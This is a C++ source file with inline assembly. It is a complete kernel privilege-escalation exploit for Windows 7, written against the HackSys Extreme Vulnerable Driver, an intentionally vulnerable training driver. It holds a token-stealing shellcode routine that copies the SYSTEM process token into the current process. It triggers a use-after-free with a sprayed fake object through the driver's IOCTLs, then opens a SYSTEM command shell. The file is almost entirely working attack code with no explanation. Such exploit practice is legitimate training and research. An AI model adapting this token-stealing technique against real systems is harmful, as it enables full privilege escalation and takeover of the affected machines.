#include "Base.h"

#define KTHREAD_OFFSET     0x124  // nt!_KPCR.PcrbData.CurrentThread
#define EPROCESS_OFFSET    0x050  // nt!_KTHREAD.ApcState.Process
#define PID_OFFSET         0x0B4  // nt!_EPROCESS.UniqueProcessId
#define FLINK_OFFSET       0x0B8  // nt!_EPROCESS.ActiveProcessLinks.Flink
#define TOKEN_OFFSET       0x0F8  // nt!_EPROCESS.Token
#define SYSTEM_PID         0x004  // SYSTEM Process PID

VOID TokenStealingPayloadWin7() {
	// Importance of Kernel Recovery
	__asm {
		pushad; Save registers state

		; Start of Token Stealing Stub
		xor eax, eax; Set ZERO
		mov eax, fs:[eax + KTHREAD_OFFSET]; Get nt!_KPCR.PcrbData.CurrentThread
		; _KTHREAD is located at FS : [0x124]

		mov eax, [eax + EPROCESS_OFFSET]; Get nt!_KTHREAD.ApcState.Process

		mov ecx, eax; Copy current process _EPROCESS structure

		mov edx, SYSTEM_PID; WIN 7 SP1 SYSTEM process PID = 0x4

		SearchSystemPID:
		mov eax, [eax + FLINK_OFFSET]; Get nt!_EPROCESS.ActiveProcessLinks.Flink
			sub eax, FLINK_OFFSET
			cmp[eax + PID_OFFSET], edx; Get nt!_EPROCESS.UniqueProcessId
			jne SearchSystemPID

			mov edx, [eax + TOKEN_OFFSET]; Get SYSTEM process nt!_EPROCESS.Token
			mov[ecx + TOKEN_OFFSET], edx; Replace target process nt!_EPROCESS.Token
			; with SYSTEM process nt!_EPROCESS.Token
			; End of Token Stealing Stub

			popad;
		pop edi;
		pop esi;
		pop ebx;
		retn;
	}
}

int main()
{
	std::int32_t *payload = (std::int32_t *)HeapAlloc(
		GetProcessHeap(),
		HEAP_ZERO_MEMORY, 1000);
	for (int i = 0; i < (0x58/4); i++)
	{
		payload[i] = (ULONG)&TokenStealingPayloadWin7;
	}

	std::auto_ptr<BaseIoctl> bc(new BaseIoctl());
	bc->OpenDevice();
	bc->sendData((const char *)payload, 0x58, HACKSYS_EVD_IOCTL_ALLOCATE_UAF_OBJECT);
	bc->sendData((const char *)payload, 0x58, HACKSYS_EVD_IOCTL_FREE_UAF_OBJECT);
	bc->sendData((const char *)payload, 0x58, HACKSYS_EVD_IOCTL_ALLOCATE_FAKE_OBJECT);
	bc->sendData((const char *)payload, 0x58, HACKSYS_EVD_IOCTL_USE_UAF_OBJECT);
	bc->CloseDevice();

	WinExec("C:\\Windows\\system32\\cmd.exe", NULL);
	return 0;
}